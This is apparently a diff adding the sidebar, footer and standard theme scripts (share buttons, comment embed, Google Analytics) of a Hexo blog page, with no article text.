+  <iframe id="sina_widget_2363006157" style="width:100%; height:500px;" frameborder="0" scrolling="no" src="http://v.t.sina.com.cn/widget/widget_blog.php?uid=2363006157&height=500&skin=wd_01&showpic=1"></iframe>
+
+  
+  <div class="archiveslist">
+    <p class="asidetitle"><a href="/archives">Archives</a></p>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">四月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">十二月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">九月 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">八月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">十二月 2013</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">十一月 2013</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">十月 2013</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">九月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">四月 2013</a><span class="archive-list-count">2</span></li></ul>
+  </div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://yangjian.me" target="_blank" title="YangJian">Alimon's Blog</a></li>
+      <li><a href="http://hexo.io" target="_blank" title="Hexo">Hexo</a></li>
+    </ul>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<div class="social-font clearfix">
+		
+		<a href="http://weibo.com/yanqueboy" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/itmaktub" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/itmaktub" target="_blank" title="github"></a>
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2016 
+		
+		<a href="http://itmaktub.com" target="_blank" title="itmaktub">itmaktub</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"itmaktub"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-54091487-1', 'itmaktub.com');  
+ga('send', 'pageview');
+</script>
+
+
+  </body>
+</html>
